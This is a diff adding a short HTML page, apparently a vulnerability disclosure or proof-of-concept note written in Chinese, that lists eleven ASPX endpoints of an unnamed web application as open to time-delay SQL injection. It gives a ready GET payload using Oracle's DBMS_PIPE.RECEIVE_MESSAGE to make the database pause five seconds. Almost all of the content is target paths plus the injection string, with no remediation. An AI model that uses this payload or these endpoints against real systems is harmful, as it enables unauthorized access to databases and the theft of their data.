@@ -1,0 +1,20 @@
+<meta charset="UTF-8">
+<div>
+    <h3>多处延时注入URL: </h3>
+    <ul>
+        <p>/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1</p>
+        <p>/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1</p>
+        <p>/Price/SuggestList.aspx?priceid=1</p>
+        <p>/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1</p>
+        <p>/Products/Category/CategoryOption.aspx?option=IsStop&classId=1</p>
+        <p>/Products/Tiens/CategoryStockView.aspx?id=1</p>
+        <p>/custom/CompanyCGList.aspx?ComId=1</p>
+        <p>/SuperMarket/InterestInfoDetail.aspx?ItemId=1</p>
+        <p>/Orders/k3orderdetail.aspx?FINTERID=1</p>
+        <p>/custom/CompanyCGList.aspx?ComId=1</p>
+        <p>/custom/GroupNewsList.aspx?child=true&groupId=121</p>
+    </ul>
+    <h3>GET-payload: </h3>
+    <p># 延时5秒</p>
+    <code>%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)</code>
+</div>
